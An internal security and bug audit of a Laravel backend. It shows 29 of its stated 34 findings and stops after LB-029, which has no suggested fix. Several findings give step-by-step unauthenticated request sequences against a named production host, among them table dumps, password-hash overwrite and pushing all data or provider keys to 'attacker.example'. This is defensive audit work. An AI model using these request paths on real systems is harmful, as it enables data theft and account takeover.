# laravel-backend bug audit (B6): report only

Role: laravel-backend · Scope: `poly_apps/laravel_main/` (no vendor/node_modules/storage/public/build) · Date: 2026-09-27
Binding doc: docs_fix/REQUIREMENTS_20260927_TEAM_BUG_AUDIT.md. No code was changed. Checks were static reads, grep and sed only.
Paths in `location` are relative to `poly_apps/laravel_main/` unless they start with `poly_apps/`.

Counts: critical 4 · high 6 · medium 10 · low 14 · total 34

Mapping to working IDs (for cross-reference only): LB-001=DS-1, LB-002=DB-1, LB-003=AI-1, LB-004=PAY-1, LB-005=WK-2, LB-006=WK-1, LB-007=WK-3, LB-008=CM-1, LB-009=CM-2, LB-010=DS-2, LB-011=DS-6, LB-012=TM-1, LB-013=DL-1, LB-014=UP-1, LB-015=RY-1, LB-016=DS-3, LB-017=DS-4, LB-018=DS-5, LB-019=CM-6, LB-020=CM-3, LB-021=DS-7, LB-022=DS-8, LB-023=DS-9, LB-024=CM-4, LB-025=CM-5, LB-026=OA-1, LB-027=OA-2, LB-028=AI-2, LB-029=PF-1, LB-030=UC-1, LB-031=SA-1, LB-032=RY-2, LB-033=PS-1, LB-034=RL-1

## Findings (most severe first)

### LB-001 — Unauthenticated `sync-peer/prepare` and `sync-peer/export-prepare` let any internet client dump every database table and resource file, or push arbitrary rows and files
- severity: critical · category: security-auth · confidence: confirmed
- location: poly_apps/laravel_main/routes/DashboardRouter/DatabaseManager.php:58-61; app/Http/Requests/DataSync/PrepareDataSyncExporterRequest.php:9-12; app/Services/DataSync/DataSyncPassiveService.php:27-67
- failure scenario: An anonymous client sends `POST https://api.si.12gm.com/api/dashboard/db-manager/sync-peer/export-prepare` with a random 32-hex `fetcher_job_id` and a 64-hex `prepare_token`. It gets back `{id, token}`, waits until the timer sets `ready`, then reads `GET …/export-sessions/{id}/database-inventory` and `…/database-chunks?connection=X&table=users&offset=N` and dumps every row of every table: users, password hashes, Sanctum tokens, API keys, CodeMart wallets. `resource-file-batch` and `resource-file-chunks` return every resource file. With `POST …/prepare` (receiver) and `…/sessions/{id}/database-chunks`, the same client upserts arbitrary rows by primary key (for example, it can overwrite an admin password hash) and writes files into the resource roots.
- evidence: The sync-peer group has only `throttle` middleware (DatabaseManager.php:58-62), and `authorize()` returns true. `prepare()` creates the session and returns `context.token` with no credential check (Passive:46-65). Every later route checks only that per-session token (`requireSession`, Passive:506-524). The only limit is "one active passive session" (Passive:39-41).
- suggested fix: Require a pre-shared pairing secret or a machine-auth signature (the pending Queue Center machine-auth design) on prepare and export-prepare, and allow-list the peer machine codes.

### LB-002 — `dashboard.auth` accepts any logged-in user, so a self-registered account can export any table, restore backups, change the PostgreSQL superuser password and drop DB users
- severity: critical · category: security-authz · confidence: confirmed
- location: app/Http/Middleware/LocalDebugOrSanctum.php:25-31; routes/DashboardRouter/DatabaseManager.php:25-56; app/Http/Controllers/Dashboard/DatabaseManagerController.php:49-165 (no admin checks)
- failure scenario: Anyone calls `POST https://api.si.12gm.com/api/register {username,password}` (the invite code is optional, so this creates a rolelevel-0 user), then `POST /api/login` to get a Sanctum token. With that token: `GET /api/dashboard/db-manager/tables/users/export?connection=…` dumps any table (password hashes, tokens, wallets). `POST …/tables/{t}/import` writes rows. `POST …/backups/{id}/restore` rolls the database back. `POST …/credentials/change {connection, new_password}` changes the configured superuser password, and `DELETE …/credentials/users/{name}` drops accounts. `POST …/sync {"target":"attacker.example","databases":true,"resources":true}` makes the server push every table and resource file to a receiver the attacker runs, and `…/sync/fetch` pulls attacker rows into the server. The same middleware gates `/api/user`, article deletes, book upload/ingest and `queue-center/mercure-authorization`. The loopback bypass (`DASHBOARD_LOCAL_DEBUG` defaults to `'true'`, also on the production server) additionally grants the highest-role user to any request that reaches Laravel from 127.0.0.1 without an X-Forwarded-For header.
- evidence: `$sanctumUser = auth('sanctum')->user(); if ($sanctumUser !== null) { … return $next($request); }` has no `isAdmin()` check. DatabaseManagerController has no `requireAdmin`. By comparison, SystemConfigController::updateConfig checks `isSuperAdmin()` itself (SystemConfigController.php:99-102).
- suggested fix: Require `isAdmin()` (and `isSuperAdmin()` for credentials, restore and import) in `LocalDebugOrSanctum`, and default `DASHBOARD_LOCAL_DEBUG` to off on non-development hosts.

### LB-003 — The public `/api/local/ai/*` routes let anyone replace or delete the server's AI provider keys, read every stored AI chat and image, and use the paid providers
- severity: critical · category: security-auth · confidence: confirmed
- location: routes/api/ai_local.php:18-47 (only `throttle:120,1`); app/Http/Controllers/Api/AiLocalController.php:316-358 (keySet/keyDelete), :387-438 (conversations/messages/attachments), :207-230 (image history)
- failure scenario: An anonymous `POST https://api.si.12gm.com/api/local/ai/keys {"key_name":"OPENROUTER_API_KEY","value":"<attacker key>"}` swaps the provider key that pycore and Laravel share (AiSecretWriter). From then on, all AI traffic, including user prompts, bills to the attacker's account and is visible there. Writing a base-URL override secret instead (`{"key_name":"SILICONFLOW_BASE_URL","value":"https://attacker.example/v1"}`; DASHSCOPE, HUNYUAN, QIANFAN and ARK have the same kind of secret, AiProviderRegistry.php:219-316,706-712) sends every later call to the attacker with the server's real provider key in the Authorization header, so the attacker steals the key. `POST …/keys/delete` removes keys (outage). `GET …/chat/conversations` plus `/{id}` return every stored conversation with its messages, `chat/attachments/{name}` and `image/history/file/{id}` serve the uploaded and generated images, and `image/history/clear` and `DELETE chat/conversations/{id}` destroy them. `POST chat`, `chat/send` and `image` spend provider quota.
- evidence: The route file header says "Public (no auth)… provider keys are never returned". The masking hides key values but does not stop writes or deletes. The controller has no identity check (no `dashboard.auth`, no loopback check).
- suggested fix: Put the group behind `dashboard.auth` (loopback debug or Sanctum admin), and leave only `catalog`/`probe`/`info` public, if even those.

### LB-004 — The DingDuoDuo recharge callback trusts any caller, so a member can mark their own order paid and get membership for free (and double-apply it through a race)
- severity: critical · category: money-state · confidence: confirmed
- location: routes/DingDuoDuoV1Router/DingDuoDuoV1Recharge.php:28-29; app/Apps/DingDuoDuoV1/DingDuoDuoV1Controllers/DingDuoDuoV1Public/DingDuoDuoV1RechargeController.php:101-150 (create :44-95)
- failure scenario: A member calls `POST /api/ding_duo_duo_v1/recharge/create {token, package_id}`. The response contains `out_trade_no`. The member then calls `POST /api/ding_duo_duo_v1/recharge/callback {"out_trade_no":"DD…"}` directly. The handler sets the order to `paid` and runs `applyRecharge` (membership extension) without checking a gateway signature, the paid amount or the caller's origin. Two concurrent callbacks both pass the unlocked `status === Paid` check and both apply the recharge.
- evidence: `$order = findByTradeNo($outTradeNo); if ($order->status === Paid) return …; $order->status = Paid; … applyRecharge($member, $package);` has no signature verification, no `lockForUpdate` and no transaction. The route has no middleware.
- suggested fix: Verify the gateway signature and amount (or allow only an admin or loopback confirm), and do an atomic `UPDATE … WHERE status='pending'` compare-and-set inside a transaction before applying the recharge.

### LB-005 — The global task, worker, task-center and queue-center control APIs are unauthenticated, including destructive bulk operations
- severity: high · category: security-auth · confidence: confirmed
- location: routes/api.php:258-300 (task/*, worker/*, task-center/*, app_qy_v1/media/*), routes/api.php:~395-417 (queue-center/*); app/Http/Controllers/TaskController.php:332-365
- failure scenario: An anonymous `POST https://api.si.12gm.com/api/task/reset-assigned {"include_processing":true}` sets every assigned or processing global task back to `pending` (`GlobalTask::resetStatusesToPending`), so workers holding a lease process the same work twice. `POST /api/task/clean-invalid` deletes tasks. `POST /api/task-center/settings` changes `use_server_binary_assist`. `POST /api/queue-center/tasks/{id}/cancel` and `/queues/{q}/head` change the queue order. `POST /api/worker/register` followed by `/worker/tasks/{type}/pull` lets any client claim real tasks and hold their leases. `/api/app_qy_v1/media/ingest|audio|ai-audio` accept content.
- evidence: `Route::withoutMiddleware([EnsureFrontendRequestsAreStateful::class])->group(...)` with no auth middleware. `cleanInvalid()` and `resetAssigned()` do no identity check (TaskController.php:332-365).
- suggested fix: Put the machine surface (worker/*, task result, media ingest) behind `pycore.client`, and the operator control plane (reset-assigned, clean-invalid, settings, queue-center mutations) behind `dashboard.auth`.

### LB-006 — Paid-cost and data-writing AppQyV1 endpoints are public: anonymous LLM proxy, TTS synthesis, dictionary writes, queue control
- severity: high · category: security-auth · confidence: confirmed
- location: routes/AppQyV1Router/AppQyV1AITools.php:44-133 (group has no auth), :146-163, :173-181; routes/AppQyV1Router/AppQyV1OrchAudio.php:12-18
- failure scenario: (1) `POST /api/app_qy_v1/ai_tools/ai/test {"provider":"openrouter","model":"<any expensive model>","prompt":"…"}` runs `chatOnce` on the server's paid API keys for anyone, which makes it a free LLM proxy (AppQyV1AIStatusController::test:113-143). (2) `tts/generate`, `tts/batch-generate` and `tts/queue/batch/add` start synthesis without auth. (3) `translation/queue/submit-bing` writes translations and invalid-word flags straight into the dictionary. (4) `task/enqueue`, `translation/queue/priority|stack`, `tts/variant-specs` (DELETE) and `cover-retry` change queue and config state. (5) `tts/worker/report`, `sentence/report`, `article/worker/replace-audio` and `orch_audio/ingest/*` accept worker results from any caller. `ServerIdentityHeader` only stamps a response header.
- evidence: `Route::prefix('app_qy_v1/ai_tools')->group(function () { … Route::post('/test' …` has no auth middleware. The comments call this an intentional "NO-AUTH worker trust level", and the machine-auth design (L3/B5) is still pending. `PycoreClientOnly` (device signature) already exists but these groups do not use it.
- suggested fix: Put the worker and control groups behind `pycore.client` (or the L3 machine auth), and the UI-facing write and cost endpoints behind `auth:sanctum`/`dashboard.auth`. Do the `ai/test` route first.

### LB-007 — Public library-cover endpoints let anonymous callers replace any public library cover with an AI image from an arbitrary prompt on the server's paid keys
- severity: high · category: security-auth · confidence: confirmed
- location: routes/AppQyV1Router/AppQyV1Vocabulary.php:15-26 (group has no auth); app/Apps/AppQyV1/AppQyV1Controllers/AppQyV1Vocabulary/AppQyV1VocabularyLibraryPublicController.php:366-395; AppQyV1VocabularyCoverTaskCtl.php:29-53
- failure scenario: An anonymous `POST /api/app_qy_v1/vocabulary/libraries/12/cover/ai-regenerate {"prompt":"<anything>"}` generates an image with the server's image-provider keys and stores it as library 12's public cover (the prompt has no length or content validation). `set_time_limit(300)` holds a FrankenPHP worker thread for the whole generation, so a few parallel calls exhaust the thread pool. `POST /libraries/cover/tasks {"ids":[…200 ids],"mode":"generate","prompt":"…"}` queues the same for 200 libraries through the chrome worker or the AI fallback.
- evidence: `Route::prefix($apiVersionPrefix)->group(function () { Route::prefix('vocabulary')->group(... Route::post('/libraries/{libraryId}/cover/ai-regenerate' ...` has no middleware. regenerateCoverAi reads `$request->input('prompt')` without validation.
- suggested fix: Put cover regenerate and enqueue behind `dashboard.auth` (admin), validate the prompt length, and run regeneration through the task queue only.

### LB-008 — Cancelling or completing a funded CodeMart project leaves the held escrow stranded; no path returns it to the client
- severity: high · category: money-state · confidence: confirmed
- location: app/Apps/CodeMartV1/CodeMartV1Services/CodeMartV1ProjectStateService.php:202-224; CodeMartV1FinanceService.php:122-136
- failure scenario: A client funds a project with 10,000 (the escrow is `held`, and the wallet is debited). The owner cancels while the project is `open`, or an admin cancels it while `in_progress`. `applySideEffects(CANCELLED)` only cancels the tasks. The escrow row stays `held`, with the unreleased remainder counted as "protected funds" in public stats, and the client's money never comes back. On `completed`, the remainder left after the task releases is also kept. Admin finance has no escrow refund or release action: `escrows` only lists rows. The escrow branch of `processRefund` is dead code, because nothing ever writes `metadata.held_escrow_id` on a payment.
- evidence: `grep recordRefund` finds only FinanceService:136, which is reached only when `held_escrow_id` > 0. `grep held_escrow_id` finds only the read at FinanceService:122.
- suggested fix: On project cancel or complete, lock the project escrows, credit `remainingAmount()` back to the payer wallet with `recordRefund`, and add an admin escrow-refund action.

### LB-009 — Approving a submission marks the task completed even when the escrow payout fails, and the developer is never paid
- severity: high · category: money-state · confidence: confirmed
- location: app/Apps/CodeMartV1/CodeMartV1Ctl/CodeMartV1TaskCtl.php:655-690; CodeMartV1EscrowService.php:141-215; CodeMartV1TaskCtl.php:178,297
- failure scenario: Task budgets are not checked against the escrow when they are created or edited (`budget_allocation nullable|numeric|min:0`). A manager creates tasks that add up to more than the funded escrow. A later task is approved: the task CASes to `completed` and the submission to `approved`. `releaseForTask` returns `released:false, error_code:'escrow_insufficient'` (all Throwables are swallowed too), and the transaction commits. The task is terminal, so it can never be re-reviewed, and nothing retries the payout. The same happens with a null budget (`task_budget_missing`).
- evidence: `$escrow = CodeMartV1EscrowService::releaseForTask(...)` has its result only echoed in the response. The outer transaction is not rolled back when `released=false`. releaseForTask catches `\Throwable` and returns an error code.
- suggested fix: Check escrow headroom when a task gets a budget (reserve it), and roll back the approval (or keep the task in review) when the release does not succeed.

### LB-010 — Push-mode compressed resource sync loops forever when final-chunk hashing and 7z extraction outlast the 120 s peer timeout
- severity: high · category: idempotency · confidence: likely
- location: app/Services/DataSync/ResourceSyncService.php:242-265; DataSyncPassiveService.php:237-256; DataSyncDriverService.php:870-903
- failure scenario: A source pushes the `static` root (4.7 GB) with compression on. The receiver handles the final `resource-chunks` request inside the HTTP request: it SHA-256-hashes the whole .7z, runs `extract7z` (timeout 3600 s) and then deletes the part file. The driver times out at 120 s (ConnectionException, then 503 busy while the lock is held) and gets `__waiting`. On the next tick it resends the final chunk at offset N. The part file is gone, so `writeFileSegment` creates an empty file and answers `{success:false, offset:0}`. The driver realigns to 0 and re-uploads the whole archive, and the extraction times out again. The session never finishes. The same thing happens once after any lost final response.
- evidence: `receiveArchiveChunk` has no "already extracted" check. Compare `receiveFileChunk`, whose offset-0 `hasHash` check makes a retry converge. `advanceArchiveChunk` resets the offset on `success=false` (Driver:892-894). REQUEST_TIMEOUT_SECONDS is 120 (DataSyncProtocol.php:11).
- suggested fix: Extract in the receiver's timer tick. Record a per-archive completion receipt keyed by `key+sha256`, and answer a replayed final chunk with `complete:true`.

### LB-011 — Timer state is lost every minute on FrankenPHP, so long-interval tasks run every minute
- severity: medium · category: timer · confidence: likely
- location: app/Services/OctaneTimerService.php:62-81,143-185,207-230; bootstrap/app.php:73-79
- failure scenario: On FrankenPHP the heartbeat runs through `schedule:work`, which starts a new `schedule:run` process every minute. `last_run` lives only in the static `$fallbackStore`. The cross-process fallback `readHeartbeatFile()` reads a snapshot that is never written, because `writeHeartbeatSnapshot()` has no caller. Each new minute therefore starts with `last_run=0`. `SslCertAutoRenewTask` (86400 s) runs `certbot renew` every minute, and other tasks with intervals over 60 s also run every minute. `timer:status` from the console shows no state.
- evidence: `grep writeHeartbeatSnapshot` finds only its definition. `register()` seeds `last_run` from `stateGet`, which returns null in a fresh process. `MAX_INLINE_TASKS_PER_TICK`, `MAX_BACKGROUND_TASKS_PER_TICK` and `BACKGROUND_POOL_LOCK` are declared and never used, and `execution_mode` is ignored in the tick.
- suggested fix: Call `writeHeartbeatSnapshot()` at the end of `tick()`, or keep `last_run` in the cache store, so intervals survive process restarts.

### LB-012 — Long synchronous jobs run inline in the one timer heartbeat and stall every 1-second task (Mercure outbox, result write-back, DataSync driver)
- severity: medium · category: timer · confidence: likely
- location: app/Services/OctaneTimerService.php:328-330,354-447; app/Services/TimerTasks/AppQyV1LibraryCoverFallbackTask.php:exec → AppQyV1LibraryCoverTaskService::runFallback:200-218 → executeFallback:339 (`regenerateWithAi`); DataSyncPassiveService::step (inventory, backups, manifest hashing)
- failure scenario: A library cover is left unclaimed, so the 5 s fallback task calls the AI image provider synchronously (tens of seconds). `tick()` runs every task one after another in the same `schedule:run` process, and the heartbeat event is `withoutOverlapping(1)`, so for that time `RealtimeOutboxPublishTask`, `GlobalTaskResultWritebackTask`, `QueueHeadNotificationTask` and `DataSyncTask` (all 1 s) do not run. UI queue events and result write-backs stall. A passive DataSync manifest build over 4.7 GB stalls them for minutes.
- evidence: `foreach (self::$tasks as $name => $task) { self::executeTaskWithInterceptor($name, $task); }`. `EXECUTION_BACKGROUND` is declared in the interface, but no task returns it and the tick never reads `execution_mode`. AppQyV1AgentHistoryAudioWritebackTask.php:21-22 says so itself: "Writeback runs 80-110s per pass and would stall the shared serial heartbeat". It is gated only while DataSync is active, so it stalls the heartbeat every 10 s the rest of the time.
- suggested fix: Run slow tasks in their own process or lane (implement `EXECUTION_BACKGROUND`, for example a separate `schedule:work` event per slow task), and keep the heartbeat for sub-second tasks.

### LB-013 — Dict-lane inflight reservations live in per-thread statics and are cleared on any dictionary write, so batched lanes create duplicate claim tasks for the same words
- severity: medium · category: octane-worker · confidence: likely
- location: app/Services/QueueCenter/DictLane/DictLaneQueueCenter.php:50,258-318 (esp. :304),342-371,389-431
- failure scenario: `dictionary_explanation` allows 2 live tasks per language. Worker pull A (FrankenPHP thread 1) materializes a task for head words 1–10 and reserves them in `self::$inflight`. Pull B lands on thread 2, whose `$inflight` is empty, so it takes the same 10 head words. The same thing happens in a single thread whenever any word lookup bumps the dirty counter (`WordLookupController:129` → `forgetMetricsCache` → `noteDictionaryWrite`), because a signature change runs `unset(self::$inflight[...])`. Either way, two live tasks carry the same 10 words, and the AI explanation (or translation/validity) work and cost are doubled. `word_audio` is safe because it deduplicates through `QueueCenterService::enqueue` group keys, but the batched lanes call `createTask` with no dedup.
- evidence: `private static array $inflight = [];` (per interpreter thread). The comment "A table change means write-backs landed … every inflight reservation for it is settled" assumes the change came from this lane's own write-back.
- suggested fix: Exclude the words already in live claim tasks of the lane when taking a batch (DB-backed reservation, or a `group_key` per batch word), rather than relying on process-local statics.

### LB-014 — Offset-v1 spools are never deleted after word or sentence TTS uploads (every uploaded audio file stays on disk twice), and a mismatching complete spool wedges its identity
- severity: medium · category: disk-leak · confidence: confirmed
- location: app/Apps/AppQyV1/AppQyV1Services/AppQyV1DurableOffsetUploadService.php:59-68,87-97; callers AppQyV1SentenceAudioController.php:164-183 and AppQyV1TTSWorkerController.php:137-153 (`completedBytes`, never deleted)
- failure scenario: (1) Each sentence or word audio that pycore delivers over offset-v1 is assembled in `<laravel_data>/writeback/app_qy_v1/worker_audio/<transfer>.<sha>.part`. The controller reads it with `completedBytes()`, stores the audio elsewhere, and leaves the spool. With 100k+ sentence variants, the spool directory grows by the full audio corpus and nothing cleans it (only the orch and delivery-batch paths `promoteCompleted` or delete). (2) When the final whole-file hash differs from `audio_sha256`, `receive()` returns null and keeps the full-size `.part`, so every retry gets `offset=total` and the same 422 again.
- evidence: `grep worker_audio` finds no cleanup. `completedBytes()` only reads. The mismatch branch is `return null;` with no delete.
- suggested fix: Delete the spool once the consumer has stored the bytes (and on a whole-file mismatch), and add an age-based sweep for abandoned spools.

### LB-015 — `pycore.client` (PycoreClientOnly → RelayDeviceIdentity) can never verify a machine: its only enrollment path `api/relay/machine/register` no longer exists, so the middleware rejects every caller
- severity: medium · category: dead-feature · confidence: likely
- location: app/Services/Relay/RelayDeviceIdentity.php:56-63,137-140; app/Http/Middleware/PycoreClientOnly.php:25-28; routes/api.php:389-391
- failure scenario: A pycore machine calls `GET /api/internal/pycore/logs/latest`, the only route behind `pycore.client`. `claimedSecret($machineId)` is null, because nothing ever writes the claim, and `isRegistration()` matches only `api/relay/machine/register`, which no route or contract defines (relay enrollment is `/api/relay/device-enrollments` and is verified by the separate RelayDeviceSignatureService). `verify()` returns false and the response is 403. The same dead gate makes `pycore.client` unusable as the "machine auth" fix for LB-006 and LB-005 until it is repaired.
- evidence: `grep machine/register` finds only RelayDeviceIdentity.php:139. The contract has `"enrollment_create": "/api/relay/device-enrollments"` (config/pycore_relay_contract.json:66). This is also two implementations of device-signature verification (`rule`).
- suggested fix: Merge RelayDeviceIdentity into RelayDeviceSignatureService (one enrollment and claim store), and point PycoreClientOnly at it.

### LB-016 — One resource file deleted after the manifest was taken fails the whole sync session
- severity: medium · category: robustness · confidence: confirmed
- location: app/Services/DataSync/ResourceSyncService.php:91-95,127-130
- failure scenario: During a multi-hour pull of about 40k files, one planned file is deleted on the exporter (cache eviction, TTS regeneration). `readFileBatch` or `readFileChunk` throws RuntimeException. The controller maps it to 409, the peer client throws, and the driver `run()` finishes the whole session as `failed`. Files that changed are skipped by design (DataSyncHashMismatchException); files that disappeared are not.
- evidence: ResourceSyncService.php:128 `throw new \RuntimeException("Unable to read the resource file…")`; DataSyncController::respond maps RuntimeException to 409; DataSyncPeerClient::send:277-278 throws on a non-2xx status; DataSyncDriverService::run catch at :117-119.
- suggested fix: Return a per-file `missing` marker, and have the driver call `skipResource()` for it, as it already does for hash mismatches.

### LB-017 — The fetcher asks the exporter for manifests of the fetcher's own resource-root keys, and one missing key fails the session
- severity: medium · category: contract · confidence: likely
- location: app/Services/DataSync/DataSyncDriverService.php:573,604-613; DataSyncPassiveService.php:86-94; ResourceSyncService.php:17-44
- failure scenario: `roots()` drops a candidate whose path is nested under an earlier root. Whether the audio, sentence or image dirs nest under `app_external_data` depends on host config overrides (`AppQyV1.paths.*`). Take a local host with a custom `audio_directory` and a server using the defaults. The local node keeps the key `app_qy_v1_word_audio` and the server drops it. The fetcher requests `/export-sessions/{id}/resources/app_qy_v1_word_audio/manifest`, and the exporter answers 422 (`Unknown resource root`) or 409 (`artifact missing`). The session fails at `fetch_exporter_resource_manifests`.
- evidence: buildLocalManifests sets `resource_roots ??= array_keys($this->resources->roots())` from local roots. fetchPeerManifests iterates those keys against the peer. The exporter builds `manifest-{key}` only for its own roots (Passive:432-436).
- suggested fix: Have the exporter publish its root keys (in the status or inventory response), and sync the intersection. Record keys that exist on only one side as skipped.

### LB-018 — Heavy work still runs inside peer HTTP requests (fresh manifest, exact row counts, 7z archive creation)
- severity: medium · category: request-heavy-work · confidence: confirmed
- location: app/Services/DataSync/DataSyncPassiveService.php:80-94,114-130; DataSyncDriverService.php:538,982
- failure scenario: In push mode, `verify_resource_manifests` calls the receiver with `fresh=1`. The receiver runs `manifest($key)` in-request, and every file received in this session is a hash-cache miss (new path, size and mtime), so it SHA-256-hashes GBs inside the request. `verify_database_counts` runs an exact `count(*)` over every table of every connection in-request. `exportArchive` runs `create7z` over a whole root in-request. Each can pass the 120 s client timeout, which leaves the driver in `__waiting` retry loops, and each breaks REQUIREMENTS_20260927_MACHINE_DATA_SYNC_REFACTOR rule 4 ("Peer requests only read artifacts…").
- evidence: resourceManifest `if ($fresh) return $this->resources->manifest($key);`. databaseCounts `$this->databases->rowCounts()`. exportArchive calls `createArchive` inside withLock.
- suggested fix: Have the passive timer compute the post-transfer manifests, the counts and the archives as artifacts, and have the requests serve them (503 until ready).

### LB-019 — CodeMart phone OTP is never sent (SMS is a TODO) and is written to the log in plain text, so no user can complete the `phone_verification` onboarding step
- severity: medium · category: dead-feature · confidence: confirmed
- location: app/Apps/CodeMartV1/CodeMartV1Utils/CodeMartV1OtpService.php:18-28; CodeMartV1BootstrapService.php:145,181-185
- failure scenario: A user calls `POST /codemart/v1/auth/request-phone-verification`. `sendOtpSms` only runs `\Log::info("OTP sent to {$phone}: {$otp}")` and returns true, so the user never receives a code. Onboarding keeps `next_step=phone_verification`, while anyone who can read the Laravel log can verify any phone. Bootstrap also reports `email_verified=true` for every user who has an email (`|| !empty($user->email)`), which hides the unverified state.
- evidence: `// TODO: Integrate with SMS provider … \Log::info("OTP sent to {$phone}: {$otp}")`
- suggested fix: Wire a real SMS provider (or mark the step optional in the contract), stop logging the OTP, and compute `email_verified` from `email_verified_at` only.

### LB-020 — Alipay and WeChat deposit `payment_url` values are unsigned placeholder URLs, so a deposit through those methods can never be paid
- severity: medium · category: dead-feature · confidence: confirmed
- location: app/Apps/CodeMartV1/CodeMartV1Ctl/CodeMartV1DepositCtl.php:217-228
- failure scenario: A developer picks `alipay` and is sent to `https://openapi.alipay.com/gateway.do?order_id=DEP…&amount=…`. The URL has no app_id, method or signature, so the gateway rejects it. The deposit stays `pending` until an admin confirms it by hand, and the role cannot activate.
- evidence: `'alipay' => "https://openapi.alipay.com/gateway.do?order_id={$orderId}&amount={$amount}"`; the `wechat` URL follows the same pattern.
- suggested fix: Offer only `bank_transfer` in `DEPOSIT_PAYMENT_METHODS` until a real gateway integration exists.

### LB-021 — `writeFileAtomic` staging name uses `getmypid()`, which all FrankenPHP worker threads share; unlocked concurrent writers of one path collide
- severity: low · category: octane-worker · confidence: likely
- location: app/Utils/FileSystemManager.php:408-413; unlocked callers: FileSystemManager::fileManifest:372-376 (hash cache written by the DataSync timer and by a peer `fresh=1` manifest request at the same time), DataSyncPassiveService::prepare:42 (finish without the session lock). The same copy-pasted pattern is in AiGateway/*.php:369/227/66/240/354/1236, DeveloperHistoryService.php:557 and AppQyV1DailySentenceService.php:161, but the AiGateway stores serialize under an `flock`'d lock file, so they are safe.
- failure scenario: FrankenPHP worker threads share one PID. Two unlocked writers of the same path use the same `<path>.<pid>.tmp` staging file. One rename publishes content the other thread is still writing, and the second rename fails (`moveFile` sees no source), which is ignored in fileManifest and makes the caller throw `Unable to persist…` in the state store.
- evidence: `$staging = $path . '.' . getmypid() . '.tmp';`. Only AiSecretWriter.php:175 adds `random_bytes`.
- suggested fix: Add `bin2hex(random_bytes(6))` to the staging name, and route the copied helpers through `FileSystemManager::writeFileAtomic` (the duplicate implementations are a `rule` issue).

### LB-022 — Superseding an idle passive session in `prepare()` calls `finish()` without the session lock
- severity: low · category: race · confidence: suspect
- location: app/Services/DataSync/DataSyncPassiveService.php:39-42
- failure scenario: A new driver prepares while the old passive session's timer tick is still in `step()` (a long manifest build holds the lock). `finish('cancelled')` deletes its artifacts. The tick then saves its stale `running` job, which brings the session back and leaves two active passive sessions.
- evidence: `$this->runtime->finish($active, 'cancelled', …)` runs outside `withLock`/`tryLock`. The driver-side cancel uses `requestCancel` plus `tryLock`.
- suggested fix: Use `requestCancel()` plus `tryLock()`, the same path as `DataSyncService::cancel`.

### LB-023 — Database chunk export uses OFFSET pagination, which is quadratic on large tables and skips rows when the exporter deletes rows mid-sync
- severity: low · category: performance · confidence: likely
- location: app/Services/DataSync/DatabaseSyncService.php:73-108
- failure scenario: For a table with N rows, the chunk at offset k makes PostgreSQL walk k index entries, so the total cost is O(N²/500). A delete on the live exporter shifts later rows back by one, so one row is never sent. `verifyDatabaseCounts` checks only `count ≥ snapshot`, so the gap goes unreported.
- evidence: `$query->offset(max(0, $offset))->limit(self::CHUNK_ROWS)` ordered by identity.
- suggested fix: Use keyset pagination on the identity columns (`next_cursor` = last identity values).

### LB-024 — The assigned-task budget lock compares strings, so resending an unchanged budget gets 409
- severity: low · category: validation · confidence: confirmed
- location: app/Apps/CodeMartV1/CodeMartV1Ctl/CodeMartV1TaskCtl.php:310-316
- failure scenario: `PUT /tasks/{id}` with `{"budget_allocation":100}` on an assigned task: `(string) 100` is `"100"`, but the stored numeric is `"100.00"` (the TaskModel has no decimal cast), so the handler answers 409 "The budget of an assigned task cannot change" even though the value did not change.
- evidence: `(string) $attributes['budget_allocation'] !== (string) $task->budget_allocation`
- suggested fix: Compare with `bccomp(money(a), money(b), 2) !== 0`.

### LB-025 — Invoice numbers collide within one second, and one payment can be invoiced any number of times
- severity: low · category: idempotency · confidence: confirmed
- location: app/Apps/CodeMartV1/CodeMartV1Ctl/CodeMartV1PaymentCtl.php:228-239
- failure scenario: A payee double-clicks "create invoice". Both requests generate `INV-YmdHis-{userId}`, the second hits the unique index on `invoice_number` (payment migration :248), and PostgreSQL raises a QueryException, which returns 500. When the calls are more than a second apart, duplicate invoices are created for the same payment.
- evidence: `'invoice_number' => 'INV-' . now()->format('YmdHis') . '-' . $user->id`; there is no idempotency key and no one-invoice-per-payment check.
- suggested fix: Use an idempotency key or a unique `payment_id` guard, and build the number from a sequence or ULID.

### LB-026 — The orch-audio task detail resolves up to 300 words one by one (N+1) on every read (file under active edit)
- severity: low · category: performance · confidence: likely
- location: app/Apps/AppQyV1/AppQyV1Services/AppQyV1OrchAudioService.php:422-446
- failure scenario: `GET /app_qy_v1/orch_audio/tasks/{key}` for a task with 300 word resources makes 300 separate `requestWord()` dictionary and file lookups in one request, although the batch `AppQyV1AudioGateway::requestWordBatch()` exists.
- evidence: `foreach (…resources…) { $resolved = $this->audioGateway->requestWord(...) }`
- suggested fix: Group words by language and call `requestWordBatch`, or ship the word list without audio and page it.

### LB-027 — Concurrent first ingest of the same orch task makes the whole batch fail with 500
- severity: low · category: idempotency · confidence: suspect
- location: app/Apps/AppQyV1/AppQyV1Services/AppQyV1OrchAudioService.php:259-318
- failure scenario: Two pycore deliveries post the same new `task_id` at the same time. Both see `findByTaskKey()===null` and both call `updateOrCreate`, and one INSERT hits the unique `task_key`. That QueryException rolls back all 50 tasks in the batch and returns 500. Re-posting later converges.
- evidence: an unlocked read-then-`updateOrCreate` inside `runInTransaction`.
- suggested fix: Use `upsert([...], ['task_key'])`, or lock with `SELECT … FOR UPDATE` / `insertOrIgnore` and then update.

### LB-028 — `store_session` gives anonymous callers unbounded, never-expiring writes into the database cache
- severity: low · category: security-dos · confidence: confirmed
- location: routes/api/system.php:20-23; app/Http/System/TokenSessionController.php:20-32
- failure scenario: A script loops `POST /api/store_session {token:random,key:x,value:<large string>}`. Each call writes a cache row with no TTL (`Cache::put($key, $value)` with the database store), and nothing caps size or count, so the `cache` table grows without bound.
- evidence: `Cache::put($cacheKey.':'.$validated['key'], $validated['value']);` with no TTL, no auth and no length limit.
- suggested fix: Require auth, add `max:` rules and a TTL, or remove the unused endpoint.

### LB-029 — The public `vocabulary/statistics?include_words=1` endpoint rebuilds, sorts and joins every public library's full word list on each call
- severity: low · category: performance · confidence: likely
- location: app/Apps/AppQyV1/AppQyV1Controllers/AppQyV1Vocabulary/AppQyV1VocabularyLibraryPublicController.php:230-251,473-545
- failure scenario: A request for page 1, 100 words loads `word_ids` of every public library of the language, runs one query per 1,000 words to get the `content` of all of them (tens of thousands of rows), and `usort`s every (library, word) pair in PHP before slicing 100. This is unauthenticated, so repeated calls pin FrankenPHP threads and the DB.
- evidence: `foreach (array_chunk(array_keys($allIds), 1000) as $chunk) { rowsByIds(...) }` followed by `usort($pairs, …)`, with no cache.
